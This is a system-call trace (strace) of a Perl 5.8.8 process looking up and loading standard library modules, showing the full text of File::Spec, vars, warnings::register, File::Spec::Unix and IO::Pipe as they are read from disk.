11891 07:39:45.175072 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175086 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175098 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175112 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175123 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175165 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175179 stat64("/usr/share/perl5/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175193 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175219 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175232 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175245 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
11891 07:39:45.175265 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.175280 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.175291 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.175308 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
11891 07:39:45.175382 stat64("/etc/perl/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175399 stat64("/etc/perl/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175412 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175424 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175437 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175449 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175463 stat64("/usr/lib/perl5/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175475 stat64("/usr/lib/perl5/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175487 stat64("/usr/share/perl5/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175499 stat64("/usr/share/perl5/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175511 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175523 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfeb59bc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175536 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfeb5aac) = -1 ENOENT (No such file or directory)
11891 07:39:45.175549 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
11891 07:39:45.175569 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
11891 07:39:45.175582 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb57c8) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.175593 _llseek(10, 0, [0], SEEK_CUR) = 0
11891 07:39:45.175609 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
11891 07:39:45.175786 stat64("/etc/perl/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175801 stat64("/etc/perl/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175815 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175827 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175841 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175854 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175868 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175880 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175894 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175909 stat64("/usr/share/perl5/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175923 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175935 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfeb550c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175949 stat64("/usr/share/perl/5.8/warnings/register.pmc",  <unfinished ...>
11889 07:39:45.175966 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
11891 07:39:45.175975 <... stat64 resumed> 0xbfeb55fc) = -1 ENOENT (No such file or directory)
11891 07:39:45.175982 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
11891 07:39:45.176003 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
11889 07:39:45.176016 <... rt_sigprocmask resumed> NULL, 8) = 0
11889 07:39:45.176033 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
11891 07:39:45.176042 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5318) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.176053 _llseek(11, 0, [0], SEEK_CUR) = 0
11891 07:39:45.176071 read(11,  <unfinished ...>
11889 07:39:45.176078 <... rt_sigprocmask resumed> [], 8) = 0
11889 07:39:45.176087 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
11891 07:39:45.176095 <... read resumed> "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
11889 07:39:45.176239 <... rt_sigprocmask resumed> NULL, 8) = 0
11889 07:39:45.176263 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
11891 07:39:45.176357 read(11,  <unfinished ...>
11889 07:39:45.176365 <... rt_sigprocmask resumed> [], 8) = 0
11889 07:39:45.176374 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
11889 07:39:45.176389 waitpid(-1,  <unfinished ...>
11891 07:39:45.176412 <... read resumed> "", 4096) = 0
11891 07:39:45.181089 close(11)         = 0
11891 07:39:45.181297 _llseek(10, 1148, [1148], SEEK_SET) = 0
11891 07:39:45.181313 _llseek(10, 0, [1148], SEEK_CUR) = 0
11891 07:39:45.181324 close(10)         = 0
11891 07:39:45.181393 _llseek(8, 594, [594], SEEK_SET) = 0
11891 07:39:45.181408 _llseek(8, 0, [594], SEEK_CUR) = 0
11891 07:39:45.181417 close(8)          = 0
11891 07:39:45.181451 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181466 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181480 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181494 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181508 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181521 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181535 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181548 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181562 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181564 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181564 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181565 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181565 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.181565 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
11891 07:39:45.181565 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.181566 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.181566 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.181566 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
11891 07:39:45.181971 brk(0x8218000)    = 0x8218000
11891 07:39:45.182113 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
11891 07:39:45.182490 read(8, "", 4096) = 0
11891 07:39:45.182505 close(8)          = 0
11891 07:39:45.182752 read(6, "", 4096) = 0
11891 07:39:45.182767 close(6)          = 0
11891 07:39:45.182934 stat64("/etc/perl/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.182951 stat64("/etc/perl/IO/Pipe.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.182965 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.182978 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.182992 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183004 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183019 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183030 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183043 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183055 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183068 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183081 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
11891 07:39:45.183189 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.183204 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.183216 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.183237 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
11891 07:39:45.183896 _llseek(6, 3425, [3425], SEEK_SET) = 0
11891 07:39:45.183914 _llseek(6, 0, [3425], SEEK_CUR) = 0
11891 07:39:45.183924 close(6)          = 0
11891 07:39:45.183948 stat64("/etc/perl/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183962 stat64("/etc/perl/IO/Socket.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183976 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.183988 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184003 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184015 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184030 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184041 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184055 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184066 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184080 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.184092 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
11891 07:39:45.184114 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.184129 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.184140 _llseek(6, 0, [0], SEEK_CUR) = 0
